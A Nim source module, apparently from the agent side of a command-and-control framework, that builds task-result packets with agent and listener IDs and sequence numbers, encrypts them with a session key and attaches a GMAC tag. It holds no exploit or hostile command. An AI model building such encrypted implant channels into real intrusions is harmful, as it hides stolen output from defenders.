import times, sugar
import ../../common/[types, serialize, sequence, crypto, utils]

proc createTaskResult*(task: Task, status: StatusType, resultType: ResultType, resultData: seq[byte]): TaskResult = 
    return TaskResult(
        header: Header(
            magic: MAGIC,
            version: VERSION, 
            packetType: cast[uint8](MSG_RESULT),
            flags: cast[uint16](FLAG_ENCRYPTED),
            size: 0'u32,
            agentId: task.header.agentId,
            seqNr: nextSequence(task.header.agentId), 
            iv: generateIV(),
            gmac: default(array[16, byte])
        ), 
        taskId: task.taskId,
        listenerId: task.listenerId,
        timestamp: uint32(now().toTime().toUnix()),
        command: task.command,
        status: cast[uint8](status),
        resultType: cast[uint8](resultType),
        length: uint32(resultData.len),
        data: resultData,
    )

proc serializeTaskResult*(ctx: AgentCtx, taskResult: var TaskResult): seq[byte] = 
    
    var packer = Packer.init()

    # Serialize result body
    packer 
        .add(taskResult.taskId)
        .add(taskResult.listenerId)
        .add(taskResult.timestamp)
        .add(taskResult.command)
        .add(taskResult.status)
        .add(taskResult.resultType)
        .add(taskResult.length)

    if cast[ResultType](taskResult.resultType) != RESULT_NO_OUTPUT:
        packer.addData(taskResult.data)

    let body = packer.pack()
    packer.reset()

    # Encrypt result body 
    let (encData, gmac) = encrypt(ctx.sessionKey, taskResult.header.iv, body, taskResult.header.seqNr)

    # Set authentication tag (GMAC)
    taskResult.header.gmac = gmac

    # Serialize header 
    let header = packer.serializeHeader(taskResult.header, uint32(encData.len))

    return header & encData 